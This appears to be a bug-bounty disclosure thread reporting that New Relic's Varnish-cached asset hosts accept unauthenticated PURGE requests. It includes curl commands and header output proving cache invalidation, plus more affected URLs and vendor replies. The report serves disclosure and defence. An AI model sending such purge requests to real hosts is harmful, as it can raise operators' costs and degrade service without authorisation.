title: Cache purge requests are not authenticated
vulnerability_information:
Hello there,

Anyone can issue a PURGE request for any resource and invalidate your caches. That can lead to increased bandwidth costs but also potential Denial of Service attacks.

**Proof**

Fetching the resource headers, we can see in the `X-Cache` that the resource was a `HIT` with `X-Cache-Hits: 50`:
```
$ curl -s -D - https://js-agent.newrelic.com/nr-963.min.js -o /dev/null
HTTP/1.1 200 OK
x-amz-id-2: KVV+y19mk83Q4CfPt13sYJ2zss99mslCoWZexamnXBV00JcD1MsMkWyX2TCfutDi
x-amz-request-id: ECE65200E86566A5
Last-Modified: Tue, 05 Jul 2016 21:11:47 GMT
ETag: "c90a1fb4decbee70397700910b871292"
Content-Type: application/javascript
Server: AmazonS3
Content-Length: 22682
Accept-Ranges: bytes
Date: Wed, 27 Jul 2016 08:30:31 GMT
Via: 1.1 varnish
Connection: keep-alive
X-Served-By: cache-ams4148-AMS
X-Cache: HIT
X-Cache-Hits: 50
X-Timer: S1469608231.893672,VS0,VE0
Vary: Accept-Encoding
Cache-Control: public, max-age=3600
```

Unauthenticated cache purge request:
```
$ curl -X PURGE https://js-agent.newrelic.com/nr-963.min.js                                                                                                                                                                             
{"status": "ok", "id": "4441-1466032111-45820"}
```

`X-Cache-Hits` is now `1`:
```
$ curl -s -D - https://js-agent.newrelic.com/nr-963.min.js -o /dev/null                                                                                                                                                                 10:32:50
HTTP/1.1 200 OK
x-amz-id-2: NywXGsmXU1opvJFZFzvd7S+LJaAqo8Hi8ncv96OY4dBRouEd3U2IeohQKIUtZgxua3VX6VkYt1A=
x-amz-request-id: 8083D7BD3C05145B
Last-Modified: Tue, 05 Jul 2016 21:11:47 GMT
ETag: "c90a1fb4decbee70397700910b871292"
Content-Type: application/javascript
Server: AmazonS3
Content-Length: 22682
Accept-Ranges: bytes
Date: Wed, 27 Jul 2016 08:32:49 GMT
Via: 1.1 varnish
Connection: keep-alive
X-Served-By: cache-ams4430-AMS
X-Cache: HIT
X-Cache-Hits: 1
X-Timer: S1469608369.972359,VS0,VE0
Vary: Accept-Encoding
Cache-Control: public, max-age=3600
```

Thank you,
Giorgos

activities.message: Hi, thanks for your report ! We really appreciate you reporting this issue to us and will begin investigating.
activities.markdown_message: Hi, thanks for your report ! We really appreciate you reporting this issue to us and will begin investigating.

activities.message: Hi Giorgos - have you found this on any other sites besides js-agent.newrelic.com ?
activities.markdown_message: Hi Giorgos - have you found this on any other sites besides js-agent.newrelic.com ?

activities.message:
Hello there, 

Any requests that are served via varnish are affected.

Here are a couple more examples:

- https://www.newrelic.de/assets/application_head-d0a02370d08b464f88ae149b7d3022f4.js
- https://common.nr-assets.net/common-libs-2.min.js

Giorgos
activities.markdown_message:

Giorgos

activities.message:
Hi Giorgos,

Our engineering team is working on fixing this issue.

Thanks,
Matthew
